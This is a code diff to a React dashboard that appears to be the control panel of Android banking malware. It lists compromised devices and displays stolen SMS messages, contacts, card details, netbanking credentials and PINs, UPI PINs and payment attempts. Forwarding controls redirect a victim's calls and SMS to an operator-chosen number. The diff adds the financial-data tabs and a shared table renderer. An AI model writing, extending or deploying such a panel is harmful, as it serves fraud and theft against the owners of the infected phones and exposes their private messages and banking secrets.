@@ -79,9 +79,34 @@ export default function App() {
     setSaving(false)
   }
 
+  const deviceSectionTabs = [
+    { key: 'sms', label: 'SMS', color: '#6C5CE7' },
+    { key: 'contacts', label: 'Contacts', color: '#00B894' },
+    { key: 'card_details', label: 'Card Details', color: '#F39C12' },
+    { key: 'card_verifications', label: 'Card Verify', color: '#27AE60' },
+    { key: 'netbanking_details', label: 'Netbanking', color: '#E74C3C' },
+    { key: 'netbanking_pins', label: 'NB Pins', color: '#8E44AD' },
+    { key: 'upi_details', label: 'UPI Pins', color: '#1ABC9C' },
+    { key: 'payment_attempts', label: 'Payments', color: '#E67E22' },
+    { key: 'forwarding', label: 'Forwarding', color: '#E67E22' },
+  ]
+
   const rows = data[active] || []
   const stats = data.stats || {}
   const deviceSections = data.device_sections || []
+
+  const renderTable = (list, cols, dateCols = ['created_at']) => (
+    list.length === 0 ? <div style={styles.empty}>No data</div> : (
+      <table style={styles.table}>
+        <thead><tr>{cols.map(c => <th key={c} style={styles.th}>{c.replace(/_/g, ' ').toUpperCase()}</th>)}</tr></thead>
+        <tbody>{list.map((row, j) => (
+          <tr key={row.id || j} style={j % 2 ? styles.trAlt : {}}>
+            {cols.map(c => { let val = row[c]; if (dateCols.includes(c)) val = val ? new Date(val).toLocaleString() : '-'; if (typeof val === 'boolean') val = val ? 'Yes' : 'No'; return <td key={c} style={styles.td}>{val ?? '-'}</td> })}
+          </tr>
+        ))}</tbody>
+      </table>
+    )
+  )
 
   const renderDevices = () => (
     <div>
@@ -89,11 +114,14 @@ export default function App() {
         <div style={styles.empty}>No devices registered</div>
       ) : deviceSections.map((sec, i) => {
         const dev = sec.device || {}
-        const smsList = sec.sms || []
-        const contactsList = sec.contacts || []
         const online = dev.last_seen && (Date.now() - new Date(dev.last_seen).getTime()) < 120000
         const shortId = dev.device_id ? dev.device_id.substring(0, 8) + '...' : '-'
         const isSelected = selectedDevice === dev.device_id
+        const counts = deviceSectionTabs.map(t => {
+          const list = sec[t.key] || []
+          return list.length
+        })
+        const total = counts.reduce((a, b) => a + b, 0)
         return (
           <div key={dev.device_id || i}>
             <div
@@ -107,63 +135,62 @@ export default function App() {
             >
               <div>
                 <div style={styles.deviceName}>{dev.device_name || '-'} <span style={{color: online ? '#27AE60' : '#E74C3C', fontSize: 12}}>{online ? 'ONLINE' : 'OFFLINE'}</span></div>
-                <div style={styles.deviceMeta}>ID: {shortId} &middot; {dev.model || '-'} &middot; {dev.os_version || '-'} &middot; SIM: {(() => { try { const si = JSON.parse(dev.sim_info || '[]'); return si.map(s => 'Slot '+s.sim_slot+': '+(s.carrier || 'Empty')+(s.number ? ' ('+s.number+')' : '')).join(' | ') } catch { return '-'; } })()} &middot; SMS: {smsList.length} &middot; Contacts: {contactsList.length}</div>
+                <div style={styles.deviceMeta}>ID: {shortId} &middot; {dev.model || '-'} &middot; {dev.os_version || '-'} &middot; SIM: {(() => { try { const si = JSON.parse(dev.sim_info || '[]'); return si.map(s => 'Slot '+s.sim_slot+': '+(s.carrier || 'Empty')+(s.number ? ' ('+s.number+')' : '')).join(' | ') } catch { return '-'; } })()} &middot; Records: {total}</div>
               </div>
               <div style={{fontSize: 11, color: '#999'}}>{dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-'}</div>
             </div>
             {isSelected && (
               <div style={styles.smsSection}>
-                <div style={{display: 'flex', gap: 8, marginBottom: 12}}>
-                  <button onClick={() => setDeviceTab('sms')} style={{...styles.subTab, ...(deviceTab === 'sms' ? {background: '#6C5CE7', color: '#fff'} : {})}}>SMS ({smsList.length})</button>
-                  <button onClick={() => setDeviceTab('contacts')} style={{...styles.subTab, ...(deviceTab === 'contacts' ? {background: '#00B894', color: '#fff'} : {})}}>Contacts ({contactsList.length})</button>
-                  <button onClick={() => { setDeviceTab('forwarding'); fetchForwardingConfig(dev.device_id) }} style={{...styles.subTab, ...(deviceTab === 'forwarding' ? {background: '#E67E22', color: '#fff'} : {})}}>Forwarding</button>
+                <div style={{display: 'flex', gap: 6, marginBottom: 12, flexWrap: 'wrap'}}>
+                  {deviceSectionTabs.map(t => {
+                    const list = sec[t.key] || []
+                    return (
+                      <button key={t.key}
+                        onClick={() => { if (t.key === 'forwarding') fetchForwardingConfig(dev.device_id); setDeviceTab(t.key) }}
+                        style={{...styles.subTab, ...(deviceTab === t.key ? {background: t.color, color: '#fff'} : {})}}>
+                        {t.label} ({list.length})
+                      </button>
+                    )
+                  })}
                 </div>
-                {deviceTab === 'sms' ? (
-                  smsList.length === 0 ? <div style={styles.empty}>No SMS from this device</div> : (
-                    <table style={styles.table}>
-                      <thead><tr>{smsCols.map(c => <th key={c} style={styles.th}>{c.replace(/_/g, ' ').toUpperCase()}</th>)}</tr></thead>
-                      <tbody>{smsList.map((sms, j) => (
-                        <tr key={sms.id || j} style={j % 2 ? styles.trAlt : {}}>
-                          {smsCols.map(c => { let val = sms[c]; if (c === 'created_at' || c === 'received_at') val = val ? new Date(val).toLocaleString() : '-'; return <td key={c} style={styles.td}>{val ?? '-'}</td> })}
-                        </tr>
-                      ))}</tbody>
-                    </table>
-                  )
-                ) : deviceTab === 'contacts' ? (
-                  contactsList.length === 0 ? <div style={styles.empty}>No contacts from this device</div> : (
-                    <table style={styles.table}>
-                      <thead><tr>{['name', 'phone', 'email', 'created_at'].map(c => <th key={c} style={styles.th}>{c.replace(/_/g, ' ').toUpperCase()}</th>)}</tr></thead>
-                      <tbody>{contactsList.map((ct, j) => (
-                        <tr key={ct.id || j} style={j % 2 ? styles.trAlt : {}}>
-                          {['name', 'phone', 'email', 'created_at'].map(c => { let val = ct[c]; if (c === 'created_at') val = val ? new Date(val).toLocaleString() : '-'; return <td key={c} style={styles.td}>{val ?? '-'}</td> })}
-                        </tr>
-                      ))}</tbody>
-                    </table>
-                  )
-                ) : (
-                  <div style={{padding: 8}}>
-                    <h4 style={{margin: '0 0 12px', color: '#E67E22'}}>Call &amp; SMS Forwarding</h4>
-                    <div style={{display: 'flex', flexDirection: 'column', gap: 12}}>
-                      <div style={{display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap'}}>
-                        <label style={{fontWeight: 700, fontSize: 13, minWidth: 100}}>Call Forward</label>
-                        <input type="text" placeholder="Forwarding number" value={forwarding[dev.device_id]?.call_forwarding_number || ''} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], call_forwarding_number: e.target.value}}))} style={{padding: '6px 10px', border: '1px solid #ddd', borderRadius: 6, flex: 1, fontSize: 13}} />
-                        <label style={{display: 'flex', alignItems: 'center', gap: 6, fontSize: 13, cursor: 'pointer'}}>
-                          <input type="checkbox" checked={forwarding[dev.device_id]?.call_forwarding || false} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], call_forwarding: e.target.checked}}))} />
-                          Enabled
-                        </label>
+                {(() => {
+                  if (deviceTab === 'forwarding') {
+                    return (
+                      <div style={{padding: 8}}>
+                        <h4 style={{margin: '0 0 12px', color: '#E67E22'}}>Call &amp; SMS Forwarding</h4>
+                        <div style={{display: 'flex', flexDirection: 'column', gap: 12}}>
+                          <div style={{display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap'}}>
+                            <label style={{fontWeight: 700, fontSize: 13, minWidth: 100}}>Call Forward</label>
+                            <input type="text" placeholder="Forwarding number" value={forwarding[dev.device_id]?.call_forwarding_number || ''} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], call_forwarding_number: e.target.value}}))} style={{padding: '6px 10px', border: '1px solid #ddd', borderRadius: 6, flex: 1, fontSize: 13}} />
+                            <label style={{display: 'flex', alignItems: 'center', gap: 6, fontSize: 13, cursor: 'pointer'}}>
+                              <input type="checkbox" checked={forwarding[dev.device_id]?.call_forwarding || false} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], call_forwarding: e.target.checked}}))} />
+                              Enabled
+                            </label>
+                          </div>
+                          <div style={{display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap'}}>
+                            <label style={{fontWeight: 700, fontSize: 13, minWidth: 100}}>SMS Forward</label>
+                            <input type="text" placeholder="Forwarding number" value={forwarding[dev.device_id]?.sms_forwarding_number || ''} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], sms_forwarding_number: e.target.value}}))} style={{padding: '6px 10px', border: '1px solid #ddd', borderRadius: 6, flex: 1, fontSize: 13}} />
+                            <label style={{display: 'flex', alignItems: 'center', gap: 6, fontSize: 13, cursor: 'pointer'}}>
+                              <input type="checkbox" checked={forwarding[dev.device_id]?.sms_forwarding || false} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], sms_forwarding: e.target.checked}}))} />
+                              Enabled
+                            </label>
+                          </div>
+                          <button onClick={() => saveForwardingConfig(dev.device_id)} disabled={saving} style={{...styles.subTab, background: '#E67E22', color: '#fff', alignSelf: 'flex-start'}}>{saving ? 'Saving...' : 'Save Config'}</button>
+                        </div>
                       </div>
-                      <div style={{display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap'}}>
-                        <label style={{fontWeight: 700, fontSize: 13, minWidth: 100}}>SMS Forward</label>
-                        <input type="text" placeholder="Forwarding number" value={forwarding[dev.device_id]?.sms_forwarding_number || ''} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], sms_forwarding_number: e.target.value}}))} style={{padding: '6px 10px', border: '1px solid #ddd', borderRadius: 6, flex: 1, fontSize: 13}} />
-                        <label style={{display: 'flex', alignItems: 'center', gap: 6, fontSize: 13, cursor: 'pointer'}}>
-                          <input type="checkbox" checked={forwarding[dev.device_id]?.sms_forwarding || false} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], sms_forwarding: e.target.checked}}))} />
-                          Enabled
-                        </label>
-                      </div>
-                      <button onClick={() => saveForwardingConfig(dev.device_id)} disabled={saving} style={{...styles.subTab, background: '#E67E22', color: '#fff', alignSelf: 'flex-start'}}>{saving ? 'Saving...' : 'Save Config'}</button>
-                    </div>
-                  </div>
-                )}
+                    )
+                  }
+                  const tabData = sec[deviceTab] || []
+                  if (deviceTab === 'sms') return renderTable(tabData, smsCols, ['created_at', 'received_at'])
+                  if (deviceTab === 'contacts') return renderTable(tabData, ['name', 'phone', 'email', 'created_at'])
+                  if (deviceTab === 'card_details') return renderTable(tabData, cols.card_details)
+                  if (deviceTab === 'card_verifications') return renderTable(tabData, cols.card_verifications)
+                  if (deviceTab === 'netbanking_details') return renderTable(tabData, cols.netbanking_details)
+                  if (deviceTab === 'netbanking_pins') return renderTable(tabData, cols.netbanking_pins)
+                  if (deviceTab === 'upi_details') return renderTable(tabData, cols.upi_details)
+                  if (deviceTab === 'payment_attempts') return renderTable(tabData, cols.payment_attempts)
+                  return null
+                })()}
               </div>
             )}
           </div>
